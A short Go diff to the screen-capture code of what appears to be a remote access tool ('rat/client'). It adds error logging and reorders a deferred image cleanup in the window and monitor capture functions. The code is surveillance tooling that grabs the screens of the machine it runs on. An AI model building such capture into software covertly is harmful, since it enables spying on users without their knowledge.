@@ -12,6 +12,7 @@ import "C"
 
 import (
 	"image"
+	"rat/client/log"
 	"rat/shared"
 	"unsafe"
 )
@@ -22,13 +23,13 @@ func CaptureWindow(handle int) image.Image {
 	}
 
 	cap := C.CaptureWindow(C.int(handle))
-	defer C.DestroyImage(cap)
 
 	if int(cap.error) != 0 || cap.image == nil {
-
+		log.Errorln("capturing window %d failed: %d", handle, int(cap.error))
 		return nil
 	}
 
+	defer C.DestroyImage(cap)
 	return handleImage(cap)
 }
 
@@ -38,7 +39,6 @@ func Capture(monitor shared.Monitor) image.Image {
 	image := C.CaptureMonitor(m)
 
 	defer C.DestroyImage(image)
-
 	return handleImage(image)
 }
 
